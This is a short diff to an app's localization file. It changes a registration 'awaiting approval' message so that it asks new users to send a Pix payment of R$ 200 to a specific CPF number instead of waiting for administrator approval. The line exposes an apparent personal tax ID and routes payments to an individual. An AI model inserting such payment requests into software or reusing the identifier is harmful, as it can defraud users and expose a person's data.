@@ -55,7 +55,7 @@
   },
   "approval": {
     "title": "Awaiting approval",
-    "message": "Your account was created successfully! The administrator needs to approve your registration to access the pool.",
+    "message": "Your account was created successfully!\nSend a Pix of R$ 200 to CPF 100.928.167-46 to access the pool.",
     "signOut": "Sign out"
   },
   "home": {
